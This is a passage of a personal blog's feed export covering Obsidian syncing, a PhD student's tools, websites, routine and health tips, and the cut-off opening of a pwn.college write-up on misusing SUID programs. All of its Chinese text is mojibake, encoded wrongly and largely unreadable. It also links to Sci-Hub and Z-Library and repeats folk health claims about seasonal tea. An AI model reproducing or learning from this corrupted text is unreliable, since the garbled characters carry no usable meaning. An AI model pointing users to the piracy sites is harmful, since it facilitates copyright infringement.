title="å¤šå¹³å°åŒæ­¥"></a>å¤šå¹³å°åŒæ­¥</h1><p>å¯ä»¥ä½¿ç”¨åšæœäº‘å¼€webdavæ¥åŒæ­¥ï¼Œè¿™æ ·å¯ä»¥å®ç°å¤šå¹³å°çš„æ— ç¼è¡”æ¥ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ç›®å‰çš„ä½¿ç”¨æ–¹æ¡ˆ</p><p>æ­¤å¤–ï¼Œå¦‚æœæœ‰å­˜å‚¨æ¡¶çš„è¯ï¼ˆæ¯”å¦‚è…¾è®¯é˜¿é‡Œçš„ossï¼Œæˆ–è€…awsçš„s3è¿™ç§ï¼‰ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨remotely saveè¿™ä¸ªæ’ä»¶è¿›è¡ŒåŒæ­¥ï¼Œç›¸å…³é˜…è¯»ï¼š<br><a href="https://blog.csdn.net/cansaizheng/article/details/125190336">Obsidianåˆ©ç”¨æ’ä»¶Remotely-saveå®ç°è¶…ä½æˆæœ¬å…¨å¹³å°äº‘ç¬”è®°_remotely save_Positive Oneçš„åšå®¢-CSDNåšå®¢</a></p><h1 id="æ¨èé˜…è¯»"><a href="#æ¨èé˜…è¯»" class="headerlink" title="æ¨èé˜…è¯»"></a>æ¨èé˜…è¯»</h1><ul><li><a href="https://forum-zh.obsidian.md/t/topic/8728">2022å¹´7æœˆï¼Œobsidian ä¾ç„¶å¿…è£…çš„ 10 ä¸ªæ’ä»¶ - ç»éªŒåˆ†äº« - Obsidian ä¸­æ–‡è®ºå›</a></li></ul><ul><li><a href="https://www.jianshu.com/p/3272cd6f0bf8">70 å¤šä¸ª Obsidian ä¸»é¢˜ - ç®€ä¹¦</a></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PhDä¹‹è·¯</title>
    <link href="/p/5bb7293b/"/>
    <url>/p/5bb7293b/</url>
    
    <content type="html"><![CDATA[<blockquote><p> åœ¨æ­¤å¤„äºŸéœ€ä¸€ä¸ªå®å¤§çš„æ²‰æ€</p></blockquote><p><img src="https://img.gls.show/img/20230906152007.png"></p><h1 id="æˆ‘çš„ç§‘ç ”å·¥å…·"><a href="#æˆ‘çš„ç§‘ç ”å·¥å…·" class="headerlink" title="æˆ‘çš„ç§‘ç ”å·¥å…·"></a>æˆ‘çš„ç§‘ç ”å·¥å…·</h1><ul><li>è®¾å¤‡<ul><li>X86å°å¼å·¥ä½œç«™ï¼ˆå·¥ä½œç”¨ï¼Œæ­è½½i9-10980XEå¤„ç†å™¨ï¼‰<ul><li>ç”Ÿäº§åŠ›å·¥å…·</li><li>å·¥ä½œä¸»åŠ›</li></ul></li><li>MacBook Proï¼ˆå‡ºé—¨ç”¨ï¼ŒM1 Pro èŠ¯ç‰‡ï¼‰<ul><li>ç”¨ä½œç§»åŠ¨åŠå…¬</li><li>ç»­èˆªæ— æ•Œï¼Œå¯ä»¥åšæŒ10å°æ—¶ä»¥ä¸Š</li></ul></li><li>ThinkPad P14s<ul><li>çš®å®è€ç”¨</li><li>æœ‰è§¦æ‘¸å±ï¼Œå¯180åº¦å¼€åˆ</li><li>ç§»åŠ¨çš„ç‘å£«å†›åˆ€</li></ul></li><li>ä¹æ­Œç”µåŠ¨å‡é™æ¡Œ</li><li>äº¬é€ Z7äººä½“å·¥å­¦æ¤…</li></ul></li><li>æ–‡çŒ®ç®¡ç†<ul><li>æˆ‘ä½¿ç”¨zoteroç®¡ç†æˆ‘çš„æ–‡çŒ®</li><li>zoteroè‡ªå¸¦äº†åŒæ­¥åŠŸèƒ½ï¼ˆå®¹é‡ä¸å¤§ï¼‰ï¼Œå¦‚æœä¸æƒ³ä»˜è´¹ä¸”éœ€è¦å¤§é‡åŒæ­¥æ–‡çŒ®å¯ä»¥è€ƒè™‘ç¬¬ä¸‰æ–¹è½¯ä»¶ï¼Œæ¯”å¦‚åšæœäº‘ã€icloudç­‰</li></ul></li><li>æŠ¥å‘Šæ’°å†™<ul><li>ä¸éœ€è¦å¤šäººåˆä½œæ—¶ï¼Œæˆ‘ä½¿ç”¨latex</li><li>å¤šäººåˆä½œæ—¶ï¼Œæˆ‘ä½¿ç”¨overleaf</li></ul></li><li>çŸ¥è¯†è®°å½•<ul><li>æˆ‘è¿‡å»æ›¾ç»å°è¯•è¿‡ä½¿ç”¨vscode+æ’ä»¶ã€texstudioã€typoraã€Rmarkdownç­‰æ–¹å¼è¿›è¡Œæ–‡å­—ä¹¦å†™å·¥ä½œ</li><li>æˆ‘ç°åœ¨ä½¿ç”¨obsidianå¯¹æˆ‘çœ‹è¿‡çš„ä¹¦ç±ã€é˜…è¯»è¿‡çš„è®ºæ–‡è¿›è¡Œè®°å½•ã€‚å¯¹äºé‚£äº›å€¼å¾—åˆ†äº«çš„ä¸œè¥¿ï¼Œæˆ‘ä¼šå°†å®ƒä»¬ä½œä¸ºåšå®¢å‘è¡¨åœ¨æˆ‘çš„ç½‘ç«™ï¼ˆ<a href="http://www.gls.show)ä¸Š./">www.gls.showï¼‰ä¸Šã€‚</a><ul><li>obsidianå…·æœ‰ä¸°å¯Œçš„æ’ä»¶æ”¯æŒï¼Œå¯ä»¥å®Œæˆå„ç§åŠŸèƒ½</li><li>notionæ˜¯å¯¹äºéç¨‹åºå‘˜çš„æœ€å¥½é€‰æ‹©ï¼Œå®ƒæ”¯æŒå¤šå¹³å°åŒæ­¥ï¼Œæ˜“äºä¸Šæ‰‹ã€‚å¯æƒœæ•°æ®æ”¾åœ¨äº‘ä¸Šï¼Œè€Œæˆ‘è®¤ä¸ºè¿™æ ·ä¸å®‰å…¨</li></ul></li></ul></li><li>é‚®ç®±<ul><li>æˆ‘ä½¿ç”¨foxmailè¿›è¡Œå¤šä¸ªé‚®ç®±çš„é›†æˆç®¡ç†</li><li>åœ¨è¿™ä¹‹å‰æˆ‘æ›¾ä½¿ç”¨è¿‡è‡ªç”±è½¯ä»¶thunder birdï¼Œä½†æ˜¯å®ƒåœ¨æˆ‘çš„æœºå™¨ä¸Šä¼šé—ªé€€ã€‚æˆ‘è¿˜ä½¿ç”¨è¿‡Outlookã€mailspringç­‰é‚®ç®±å®¢æˆ·ç«¯ï¼Œä½†æ˜¯éƒ½ä¼šæœ‰ä¸€äº›ç‘•ç–µ</li></ul></li><li>ç»„ä¼šslides<ul><li>å…³äºåˆ¶ä½œç»„ä¼šslidesçš„æ–¹å¼ï¼Œæˆ‘çš„ä½¿ç”¨è·¯çº¿ï¼ˆæ—¶é—´é¡ºåºï¼‰å¦‚ä¸‹ï¼šå¾®è½¯PowerPoint-ã€‹md+pandoc-ã€‹reveal.js-ã€‹latex beamer-ã€‹è°·æ­Œdoc</li><li><del>ä»å–œæ¬¢æŠ˜è…¾åˆ°å¤§é“è‡³ç®€ï¼Œä½†æ˜¯æœ€è¿‘åˆè§‰å¾—slidevå¾ˆå¥½ç©</del></li></ul></li><li>ç¼–ç <ul><li>å¯¹äºå°å‹çš„ç¼–ç å·¥ä½œï¼Œæˆ‘ä½¿ç”¨terminal+vimã€tumxã€git</li><li>å¯¹äºä¸­å¤§å‹çš„ç¼–ç å·¥ä½œï¼Œæˆ‘ä½¿ç”¨vscodeæˆ–è€…jetbrainçš„ideï¼ˆå­¦ç”Ÿå¯ä»¥ä½¿ç”¨é‚®ç®±å…è´¹è·å–æ­£ç‰ˆlicenceï¼‰</li><li>æˆ‘åœ¨è…¾è®¯äº‘ä¸Šè´­ä¹°äº†ä¸€å°æœåŠ¡å™¨å’Œå¯¹è±¡å­˜å‚¨æœåŠ¡ï¼Œç”¨æ¥è·‘ä¸€äº›æœåŠ¡ã€‚è¿™ä¸ªç½‘ç«™å°±æ¶è®¾åœ¨ä¸Šé¢</li></ul></li><li>ç§‘ç ”ç»˜å›¾<ul><li>PowerPointã€Python matplotã€Rstudio</li></ul></li><li>ç¿»è¯‘<ul><li>æµè§ˆå™¨ä¸Šæˆ‘ä½¿ç”¨æ²™æ‹‰æŸ¥è¯ã€æ²‰æµ¸å¼ç¿»è¯‘</li><li>å…¨å±€ä¸‹æˆ‘ä½¿ç”¨ç½‘æ˜“çš„åˆ’è¯åŠŸèƒ½</li></ul></li></ul><h1 id="æˆ‘ä»¥ä¸ºçš„ç§‘ç ”å¿…å¤‡ç½‘ç«™"><a href="#æˆ‘ä»¥ä¸ºçš„ç§‘ç ”å¿…å¤‡ç½‘ç«™" class="headerlink" title="æˆ‘ä»¥ä¸ºçš„ç§‘ç ”å¿…å¤‡ç½‘ç«™"></a>æˆ‘ä»¥ä¸ºçš„ç§‘ç ”å¿…å¤‡ç½‘ç«™</h1><p>æ–‡çŒ®æœç´¢</p><ul><li><a href="https://dblp.org/">dblp: computer science bibliography</a></li><li><a href="https://scholar.google.com.hk/?hl=zh-CN">Google å­¦æœ¯æœç´¢</a><ul><li>æˆ–è®¸å¯ä»¥å°è¯•ä¸€ä¸‹é«˜çº§æœç´¢</li><li><a href="https://scholar.google.com/citations?view_op=top_venues&hl=en&vq=eng_computersecuritycryptography">Computer Security &amp; Cryptography - Google Scholar Metrics</a></li><li><a href="https://scholar.google.com/citations?view_op=top_venues&hl=en&vq=eng_softwaresystems">Software Systems - Google Scholar Metrics</a></li><li><a href="https://scholar.google.com/citations?view_op=top_venues&hl=en&vq=eng_computingsystems">Computing Systems - Google Scholar Metrics</a></li></ul></li><li><a href="https://www.connectedpapers.com/">Connected Papers | Find and explore academic papers</a></li><li><a href="https://arxiv.org/">arXiv.org e-Print archive</a></li></ul><p>æ–‡çŒ®ä¸‹è½½</p><ul><li><a href="https://sci-hub.se/">Sci-Hub: å°†çŸ¥è¯†å¸¦ç»™æ¯ä¸ªäºº</a></li><li><a href="https://z-lib.is/">Z-Library Project - Electronic library. Download books free</a></li></ul><h2 id="ç§‘ç ”ä¹‹å¤–çš„å¸¸é€›ç½‘ç«™ï¼Ÿ"><a href="#ç§‘ç ”ä¹‹å¤–çš„å¸¸é€›ç½‘ç«™ï¼Ÿ" class="headerlink" title="ç§‘ç ”ä¹‹å¤–çš„å¸¸é€›ç½‘ç«™ï¼Ÿ"></a>ç§‘ç ”ä¹‹å¤–çš„å¸¸é€›ç½‘ç«™ï¼Ÿ</h2><ul><li><p>æˆ‘åœ¨è¿™é‡Œè·å–ä¸€äº›å¿«ä¹ï¼š</p><ul><li><a href="https://phdcomics.com/">PHD Comics: New Book! Oliverâ€™s Great Big Universe!</a></li></ul></li><li><p>æˆ‘åœ¨è¿™é‡Œè·å–ä¸€äº›èµ„è®¯ï¼š</p><ul><li><a href="https://www.quora.com/">Quora - A place to share knowledge and better understand the world</a></li><li><a href="https://thesiswhisperer.com/">The Thesis Whisperer</a></li><li><a href="https://news.ycombinator.com/">Hacker News</a></li><li><a href="https://www.v2ex.com/">V2EX</a></li><li><a href="https://github.com/">GitHub: Letâ€™s build from here Â· GitHub</a></li><li><a href="https://tophub.today/c/news">ä»Šæ—¥çƒ­æ¦œ</a></li><li><a href="https://rebang.today/">ä»Šæ—¥çƒ­æ¦œ</a></li></ul></li></ul><h1 id="åšç ”ç©¶çš„æ–¹æ³•è®º"><a href="#åšç ”ç©¶çš„æ–¹æ³•è®º" class="headerlink" title="åšç ”ç©¶çš„æ–¹æ³•è®º"></a>åšç ”ç©¶çš„æ–¹æ³•è®º</h1><ul><li><a href="https://www.eecs.harvard.edu/htk/phdadvice/">Useful Thoughts about Research</a></li><li><a href="https://zhuanlan.zhihu.com/p/512528671?utm_source=wechat_session&utm_medium=social&utm_oi=1466693950451363841&utm_content=group2_article&utm_campaign=shareopn&s_r=0">é¡¶ä¼šè®ºæ–‡çš„ç»éªŒåˆ†äº«ä¸å¿ƒè·¯å†ç¨‹</a></li><li>web.stanford.edu/class/ee384m/Handouts/HowtoReadPaper.pdf</li></ul><h1 id="daily-routine"><a href="#daily-routine" class="headerlink" title="daily routine"></a>daily routine</h1><p>æ—©é¥­ä¸€èˆ¬åƒéº¦å½“åŠ³</p><ul><li>å¦‚æœå‰ä¸€æ™šç¡çœ ä¸é”™çš„è¯æˆ‘ä¼šç‚¹è±†æµ†</li><li>å¦‚æœç¡çœ ä¸å¥½çš„è¯æˆ‘ä¼šæ¢æˆå’–å•¡</li></ul><p>ä¸€èˆ¬æˆ‘åœ¨æ—©ä¸Šä¹ç‚¹é’Ÿå¼€å§‹å·¥ä½œï¼ŒåŠ›æ±‚é«˜æ•ˆ</p><p>ç§‘ç ”æ—¶æˆ‘ä¼šå¬ä¸€äº›å¤å…¸éŸ³ä¹ï¼Œ<a href="https://gls.show/about/">è¿™é‡Œ</a>æœ‰ä¸€ä»½æˆ‘ç§‘ç ”æ—¶çš„éŸ³ä¹æ¸…å•</p><p>åœ¨æˆ‘åšé€‰æ‹©çš„æ—¶å€™ï¼Œæˆ‘ç»å¸¸å¬å‘½è¿äº¤å“æ›²ï¼Œè´å¤šèŠ¬æ˜¯æˆ‘åœ¨éŸ³ä¹ä¸Šçš„å¶åƒ</p><p>æˆ‘ä½¿ç”¨obsidiançš„ä¸€äº›æ‹“å±•è¿›è¡Œæˆ‘æ¯æ—¥çš„è®°å½•ï¼Œæˆ‘è®¤ä¸ºè®°å½•æ¯æ—¥çš„å·¥ä½œå’Œç”Ÿæ´»æ˜¯ä¸€ä¸ªè‰¯å¥½çš„ä¹ æƒ¯</p><ul><li>calendarã€‚å¯ä»¥åœ¨obä¸­æ˜¾ç¤ºæ—¥å†ï¼Œå¹¶ä¸”å¿«é€Ÿåˆ›å»ºå½“å¤©çš„ç¬”è®°</li><li><del>dayplanner</del>ã€‚è™½ç„¶æ„Ÿè§‰ç”˜ç‰¹å›¾å¾ˆé…·ï¼Œä½†æ˜¯ç»´æŠ¤å®ƒæœ‰ç‚¹å¤ªå¤æ‚äº†</li></ul><p>æˆ‘è‡ªå¤§å­¦å¼€å§‹å¯¹èŒ¶å­¦æœ‰å¾ˆæµ“åšçš„å…´è¶£ï¼Œå¹¶ä¿æŒè‡³ä»Šï¼Œæˆ‘æ¯å¤©éƒ½ä¼šå–èŒ¶ï¼Œå¶å°”ä¼šç”¨å’–å•¡ä»£æ›¿</p><h1 id="æˆ‘ä¸ºä»€ä¹ˆé€‰æ‹©ç›´åš"><a href="#æˆ‘ä¸ºä»€ä¹ˆé€‰æ‹©ç›´åš" class="headerlink" title="æˆ‘ä¸ºä»€ä¹ˆé€‰æ‹©ç›´åš"></a>æˆ‘ä¸ºä»€ä¹ˆé€‰æ‹©ç›´åš</h1><h1 id="ç§‘ç ”ä¹‹å¤–æˆ‘åœ¨åšä»€ä¹ˆ"><a href="#ç§‘ç ”ä¹‹å¤–æˆ‘åœ¨åšä»€ä¹ˆ" class="headerlink" title="ç§‘ç ”ä¹‹å¤–æˆ‘åœ¨åšä»€ä¹ˆ"></a>ç§‘ç ”ä¹‹å¤–æˆ‘åœ¨åšä»€ä¹ˆ</h1><h1 id="å†™ç»™åŒé¾„åšå£«ç”Ÿçš„ä¸€ä»½å¥åº·æŒ‡å—"><a href="#å†™ç»™åŒé¾„åšå£«ç”Ÿçš„ä¸€ä»½å¥åº·æŒ‡å—" class="headerlink" title="å†™ç»™åŒé¾„åšå£«ç”Ÿçš„ä¸€ä»½å¥åº·æŒ‡å—"></a>å†™ç»™åŒé¾„åšå£«ç”Ÿçš„ä¸€ä»½å¥åº·æŒ‡å—</h1><h1 id="é¥®æ°´"><a href="#é¥®æ°´" class="headerlink" title="é¥®æ°´"></a>é¥®æ°´</h1><p>ä¸€ä¸ªå¹¿ä¸ºæµä¼ çš„è¯´æ³•æ˜¯è¿™æ ·çš„ï¼Œæˆ‘ä»¬æ¯å¤©åº”è¯¥å–è‡³å°‘8æ¯æ°´ï¼Œé™¤äº†ä»»ä½•å…¶ä»–çš„é¥®æ–™ä¹‹å¤–ï¼Œæ¯å¤©è¿˜è¦å–8æ¯240æ¯«å‡çš„æ°´ï¼Œæ€»é‡æ¥è¿‘ä¸¤å‡</p><p>è¿™ä¸ªè¯´æ³•æœ‰å¾ˆå¤šå‡ºå¤„ï¼Œæ¯”å¦‚ï¼š</p><ul><li>1945å¹´ï¼Œç¾å›½å›½å®¶ç ”ç©¶å§”å‘˜ä¼šï¼ˆNational Research Councilï¼‰çš„é£Ÿå“ä¸è¥å…»å§”å‘˜ä¼šï¼ˆFood and Nutrition Boardï¼‰å»ºè®®ï¼Œæˆå¹´äººæ¯é£Ÿç”¨ä¸€å¡è·¯é‡Œé£Ÿç‰©ï¼Œå°±è¦æ‘„å…¥ä¸€æ¯«å‡æ¶²ä½“ã€‚å¥³æ€§å¦‚æœæ‘„å…¥2000å¡è·¯é‡Œçš„é£Ÿç‰©å°±è¦å–ä¸¤å‡æ¶²ä½“ï¼Œè€Œæ‘„å…¥2500å¡è·¯é‡Œçš„ç”·æ€§åˆ™éœ€è¦é¥®ç”¨2.5å‡æ¶²ä½“ã€‚</li><li>è‹±å›½å›½æ°‘ä¿å¥ç³»ç»Ÿï¼ˆNHSï¼‰å»ºè®®ï¼Œå¯¹äºé‚£äº›ä¸æŒ‰å®˜æ–¹æŒ‡å¼•å–æ°´ä¹Ÿä¸ä¼šè§‰å¾—å£æ¸´çš„äººï¼Œæ¯å¤©å–6åˆ°8æ¯æ¶²ä½“å³å¯ï¼ŒåŒ…æ‹¬ä½è„‚ç‰›å¥¶ã€æ— ç³–é¥®æ–™ã€èŒ¶å’Œå’–å•¡</li></ul><p>ä¸¤ä¸ªå–æ°´çš„å‡†åˆ™ï¼š</p><ul><li>ä¸è¦ç­‰åˆ°å£æ¸´æ‰ä¸»åŠ¨å–æ°´</li><li>å…«æ¯æ°´å¹¶éé‡‘è§„ç‰å¾‹ï¼Œè¦å› äººè€Œå¼‚</li></ul><h1 id="é¥®èŒ¶"><a href="#é¥®èŒ¶" class="headerlink" title="é¥®èŒ¶"></a>é¥®èŒ¶</h1><p>é¥®èŒ¶å¯¹äººä½“å¤§æœ‰è£¨ç›Šï¼Œè¿™ä¸€ç‚¹å¯ä»¥è¢«çŸ¥ç½‘å¤§é‡çš„è®ºæ–‡ä½è¯ã€‚æ¯«æ— ç–‘é—®ï¼ŒèŒ¶å¶æ˜¯æ¯”é…’ç²¾ã€å’–å•¡æ›´å¥åº·çš„é¥®æ–™</p><p>ä¸åŒçš„èŒ¶æœ‰ä¸åŒçš„ç‰¹ç‚¹ï¼Œæœ‰è¿™æ ·ä¸€ä¸ªè¯´æ³•ï¼šâ€œå¤å–ç»¿ï¼Œå†¬å–çº¢ï¼Œä¸€å¹´å››å­£å–ä¹Œé¾™â€ï¼ŒèŒ¶å¶æœ‰<strong>ç›¸æ€§</strong>ï¼Œåœ¨é€‚åˆçš„å­£èŠ‚å–é€‚åˆçš„èŒ¶ï¼Œæ‰èƒ½ä½¿å¯¹èº«ä½“çš„å¥½å¤„æœ€å¤§åŒ–</p><ul><li>æ˜¥èŠ‚ï¼šèŠ±èŒ¶ã€‚èŠ±èŒ¶çš„èŠ³é¦™ä¹‹æ°”å¯ä»¥ä»¤äººç²¾ç¥æŒ¯å¥‹ï¼Œå¿ƒæƒ…èˆ’ç•…</li><li>å¤å­£ï¼šç»¿èŒ¶ã€‚å¤å­£ç‚çƒ­é«˜æ¸©ï¼Œå®¹æ˜“ä¸­æš‘å’Œå›°ä¹ï¼Œç»¿èŒ¶å¯Œå«èŒ¶å¤šé…šã€æ°¨åŸºé…¸ã€å’–å•¡ç¢±ã€ç»´ç”Ÿç´ ç­‰è¥å…»å…ƒç´ ï¼Œå–ç»¿èŒ¶ä¸€æ–¹é¢æœ‰ç›Šäºå¾®é‡å…ƒç´ çš„æ‘„å…¥ï¼Œä¸€æ–¹é¢æœ‰ç›Šäºæ¶ˆçƒ­è§£æš‘ã€æç¥é†’è„‘</li><li>ç§‹å­£ï¼šä¹Œé¾™èŒ¶ã€‚ç§‹å­£æ°”å€™ç”±çƒ­è½¬å‡‰ï¼Œå¤©æ°”å¹²ç‡¥ï¼Œä¹Œé¾™èŒ¶èŒ¶æ€§æ¸©å’Œï¼Œä»‹äºçº¢èŒ¶ä¸ç»¿èŒ¶ä¹‹é—´ï¼Œå¯ä½¿äººå£é½¿ç”Ÿæ´¥ï¼Œæ¶¦è‚ æ¶ˆç§¯</li><li>å†¬å­£ï¼šçº¢èŒ¶ã€‚å†¬å­£å¯’æ°”é‡æ°”å€™å†·ï¼Œçº¢èŒ¶æ€§æš–ï¼Œé¥®ç”¨çº¢èŒ¶å¯ä»¥å¾¡å¯’</li></ul><h1 id="è…°æ¤ä¿æŠ¤"><a href="#è…°æ¤ä¿æŠ¤" class="headerlink" title="è…°æ¤ä¿æŠ¤"></a>è…°æ¤ä¿æŠ¤</h1><p>TBD</p><p>å‚è€ƒï¼šã€Šéº¦è‚¯åŸºç–—æ³•ã€‹</p><h1 id="è§†åŠ›ä¿æŠ¤"><a href="#è§†åŠ›ä¿æŠ¤" class="headerlink" title="è§†åŠ›ä¿æŠ¤"></a>è§†åŠ›ä¿æŠ¤</h1><blockquote><p>å¦‚ä»Šæµçš„æ³ªçš„éƒ½æ˜¯å½“åˆå¹´å°‘æ— çŸ¥è„‘å­è¿›çš„æ°´ï¼Œåœ¨ç°åœ¨æœ‰äº†ä¿æŠ¤è§†åŠ›çš„è§‰æ‚Ÿçš„æ—¶å€™ï¼Œå·²ç»é«˜åº¦è¿‘è§†äº†ï¼Œè€Œä¸”æœ‰ç€å¼±è§†çš„è¶‹åŠ¿ï¼ˆé«˜åº¦è¿‘è§†å¾ˆéš¾çŸ«æ­£åˆ°æ­£å¸¸è§†åŠ›ï¼‰ã€‚åœ¨è¿™é‡Œè®°å½•ä¸€äº›ä¿æŠ¤è§†åŠ›çš„æ–¹æ³•ï¼š</p></blockquote><ul><li>æ¯å¤©ä¸è‡ªç„¶å…‰æ¥è§¦è‡³å°‘ä¸¤ä¸ªå°æ—¶ï¼Œæœ‰ç§‘å­¦ç ”ç©¶è¡¨æ˜ä¸æ¥è§¦é˜³å…‰å®¹æ˜“å½±å“è§†åŠ›</li><li>ä½¿ç”¨çƒ­æ¯›å·¾æ•·çœ¼ç›ï¼Œæˆ–è€…åˆç¡æ—¶ä½¿ç”¨è’¸æ±½çœ¼ç½©</li><li>é—­ä¸Šçœ¼ç›ç¼“æ…¢è½¬åŠ¨çœ¼çƒ</li><li>é•¿æ—¶é—´ç”¨çœ¼ä¹‹åï¼Œå‘è¿œå¤„çœºæœ›</li><li>åœ¨å…‰çº¿å……è¶³çš„æƒ…å†µä¸‹ä½¿ç”¨ç”µå­äº§å“ï¼Œæ™šä¸Šä¸è¦åœ¨æ²¡æœ‰å…‰çº¿çš„æƒ…å†µä¸‹ç©æ‰‹æœºï¼Œè¿™æ ·å¾ˆå®¹æ˜“é€ æˆæ•£å…‰åŠ é‡</li><li>å¯ä»¥è€ƒè™‘ä½¿ç”¨å±å¹•æŒ‚ç¯ï¼Œå‡å°‘æ˜¾ç¤ºå™¨å¯¹çœ¼ç›çš„å½±å“</li><li>å®šæœŸå»åŒ»é™¢æ£€æŸ¥çœ¼ç›ï¼Œä»¥é˜²æ­¢çœ¼ç›çš„ç—…å˜</li><li>å¤šæ‰“ä¹’ä¹“çƒ</li></ul><blockquote><p>8-16å»äº†ä¸€è¶Ÿå®å²›çœ¼é•œï¼Œåšäº†éªŒå…‰å’Œçœ¼åº•æ£€æŸ¥ï¼ŒèŠ±äº†ä¸€ç™¾å¤šå…ƒï¼Œç„¶åèŠ±äº†ä¸€åƒå¤šå…ƒé…é•œï¼Œä½“éªŒå¾ˆå¥½ï¼ŒåŒæ—¶ä¹Ÿæ„Ÿå—åˆ°äº†è¿™ä¸–ç•Œä¸Šæœ€è´µçš„å°±æ˜¯èº«ä½“ï¼Œä¸€å‰¯æ™®é€šçš„çœ¼é•œéšéšä¾¿ä¾¿å°±å¯ä»¥èŠ±æ‰ä½ å‡ åƒå—é’±</p></blockquote><h1 id="æ–‡çŒ®é˜…è¯»æ–¹æ³•è®º"><a href="#æ–‡çŒ®é˜…è¯»æ–¹æ³•è®º" class="headerlink" title="æ–‡çŒ®é˜…è¯»æ–¹æ³•è®º"></a>æ–‡çŒ®é˜…è¯»æ–¹æ³•è®º</h1><p>TBD</p><h1 id="å¥èº«"><a href="#å¥èº«" class="headerlink" title="å¥èº«"></a>å¥èº«</h1><ul><li>åšæŒè‡ªç”±é‡é‡å™¨æ¢°ã€‚å“‘é“ƒå’Œæ é“ƒä¾æ—§æ˜¯æœ€å¥½çš„é€‰æ‹©ï¼Œç‰¹åˆ«æ˜¯å¯¹äºä»¥å¢è‚Œä¸ºç›®çš„çš„åˆå­¦è€…ã€‚</li><li>åšæŒå¤åˆè¿åŠ¨ã€‚åšæŒé‚£äº›åŸºæœ¬åŠ¨ä½œï¼Œå¦‚æ·±è¹²ã€ç¡¬æ‹‰ã€æ é“ƒå§æ¨ï¼Œå¹¶å°†å…¶ä½œä¸ºé•¿æœŸè®¡åˆ’ä¸­çš„åŠ¨ä½œå†…å®¹ã€‚</li><li>å»ºç«‹è§„åˆ’ã€‚éœ€è¦æœ‰ä¸€ä¸ªä¸¥æ ¼çš„å¥èº«è®¡åˆ’ï¼Œå¹¶æŒ‰ç…§è®¡åˆ’æ‰§è¡Œã€‚åŒ…æ‹¬ä½ éœ€è¦åšçš„ç»ƒä¹ åŠ¨ä½œï¼Œä»¥åŠç»ƒä¹ çš„ç»„æ•°å’Œæ¯ç»„çš„æ•°é‡ã€‚è¸è¿›å¥èº«æˆ¿çš„ä¸€åˆ»ï¼Œä½ éœ€è¦ç¡®åˆ‡åœ°çŸ¥é“æ¥ä¸‹æ¥è¦ç»ƒä¹ çš„åŠ¨ä½œã€‚</li><li>è®­ç»ƒé¢‘ç‡ã€‚æ¯å‘¨å®‰æ’3æ¬¡æˆ–4æ¬¡çš„è®­ç»ƒï¼Œè®­ç»ƒæ—¥å¤–çš„æ—¶é—´æ˜¯ç”¨æ¥ä¼‘æ¯å’Œæ¢å¤çš„ï¼Œä¼‘æ¯å’Œè®­ç»ƒä¸€æ ·é‡è¦ã€‚</li><li>ä¸€å‘¨å†…æ¯ä¸ªè‚Œç¾¤éƒ½éœ€è¦ç»ƒä¹ ã€‚</li><li>è§„èŒƒåŠ¨ä½œã€‚åšé”™è¯¯çš„åŠ¨ä½œè¿˜ä¸å¦‚ä¸åšã€‚</li><li>é€æ¸å¢åŠ é‡é‡ã€‚å¦‚æœä½ å·²ç»æŒæ¡äº†æ¯ä¸ªåŠ¨ä½œçš„æ­£ç¡®æ–¹æ³•ï¼Œå°±å¯ä»¥å¼€å§‹å‘¨æœŸæ€§åœ°å¢åŠ é‡é‡ã€‚</li><li>å¤šé¤ã€‚æ¯å¤©4-5é¤ï¼Œé—´éš”3-4å°æ—¶ã€‚å‡†å¤‡ä¸€äº›å¥åº·çš„é›¶é£Ÿã€‚</li><li>é¿å…åƒåœ¾é£Ÿå“ã€‚æ‘„å–å¥åº·çš„é£Ÿç‰©ï¼Œå¦‚ç˜¦è‚‰è›‹ç™½è´¨ã€å¤åˆç¢³æ°´åŒ–åˆç‰©ã€å’Œå¥åº·çš„è„‚è‚ªï¼Œè¿œç¦»åƒåœ¾é£Ÿå“ã€å¤§é‡ç”œé£Ÿå’Œæ²¹è…»çš„é£Ÿç‰©ã€‚</li><li>å¤šæ‘„å…¥æ°´æœå’Œè”¬èœã€‚é™¤äº†è›‹ç™½è´¨ã€ç¢³æ°´åŒ–åˆç‰©å’Œè„‚è‚ªï¼Œä½ çš„èº«ä½“ä¹Ÿéœ€è¦å¾®é‡è¥å…»ç´ ï¼ˆç»´ç”Ÿç´ å’ŒçŸ¿ç‰©è´¨ï¼‰ã€‚å› æ­¤ï¼Œè¯·ç¡®ä¿æ¯ä¸€å¤©æ‘„å…¥è¶³é‡çš„æ°´æœå’Œè”¬èœã€‚</li><li>ä¼‘æ¯å’Œæ¢å¤ã€‚æ¯å¤©æ™šä¸Šéƒ½è¦ä¿è¯å……è¶³çš„ç¡çœ ï¼ˆçº¦8-9å°æ—¶ï¼‰ã€‚</li></ul><h1 id="ç¡çœ é©å‘½"><a href="#ç¡çœ é©å‘½" class="headerlink" title="ç¡çœ é©å‘½"></a>ç¡çœ é©å‘½</h1><ul><li></li></ul><h1 id="ç–¾ç—…é¢„é˜²"><a href="#ç–¾ç—…é¢„é˜²" class="headerlink" title="ç–¾ç—…é¢„é˜²"></a>ç–¾ç—…é¢„é˜²</h1>]]></content>
    
    
    <categories>
      
      <category>æ‚è°ˆ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ”»ç•¥ï¼Œè§„åˆ’</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn college åˆ·é¢˜è®°å½•ï¼šfundamental-program misuse</title>
    <link href="/p/7b0851b2/"/>
    <url>/p/7b0851b2/</url>
    
    <content type="html"><![CDATA[<p><img src="/image/pwn-college.png"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>åœ¨åšå®Œæœ¬èŠ‚åï¼Œä½ å°†ä¼šï¼š</p><ul><li>ç†Ÿæ‚‰linuxå‘½ä»¤çš„ä½¿ç”¨</li><li>çŸ¥æ™“å‡è®¾<strong>æŸå‘½ä»¤å¯¹åº”çš„äºŒè¿›åˆ¶æ–‡ä»¶æ˜¯suidç¨‹åºçš„æƒ…å†µä¸‹</strong>ï¼Œå¯ä»¥å¦‚ä½•å¾—åˆ°flagã€‚è¿™äº›å‘½ä»¤åŒ…æ‹¬ä½†æ˜¯ä¸é™äºï¼š<ul><li>ssh-keygenï¼ˆæ€ªèµ·æ¥äº†ï¼‰</li><li>Makefile<br>è¿™ä¸ªæˆ–è®¸æœ‰ç”¨ï¼š<a 